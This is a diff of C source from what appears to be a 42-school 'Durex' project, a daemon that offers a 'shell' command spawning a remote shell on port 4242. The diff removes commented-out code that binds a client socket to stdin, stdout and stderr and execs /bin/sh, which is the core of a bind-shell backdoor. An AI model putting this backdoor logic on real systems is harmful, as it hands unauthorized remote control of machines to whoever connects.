@@ -6,7 +6,7 @@
 /*   By: user42 <user42@student.42.fr>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2022/02/09 12:00:08 by user42            #+#    #+#             */
-/*   Updated: 2022/02/13 16:35:19 by user42           ###   ########.fr       */
+/*   Updated: 2022/02/16 12:26:55 by user42           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -59,7 +59,7 @@ void	durex_daemon(void)
 								send_info(&server, server.pfds[i].fd, "?		show this help\nshell		Spawn shell on 4242\nexit		Close connection\n$> ");
 							else if (!strcmp(server.buff, "shell"))
 							{
-								send_info(&server, server.pfds[i].fd, "Spawning your shell on 4242. Reconnect to this port to access it !");
+								send_info_all(&server, "Spawning your shell on 4242. Reconnect to this port to access it !");
 								durex_shell(&server);
 								break ;
 							}
@@ -78,33 +78,3 @@ void	durex_daemon(void)
 		}
 	}
 }
-
-
-
-
-
-
-
-/*
-
-
-	pid = fork();
-	if (pid == 0)
-	{
-		
-
-		dup2(client_sock, 0);
-		dup2(client_sock, 1);
-		dup2(client_sock, 2);
-
-		execve("/bin/sh", args, NULL);
-		close(server->listen_sd);
-	}
-	else
-	{
-		waitpid(pid, &status, 0);
-		durex_daemon();
-	}
-
-
-*/
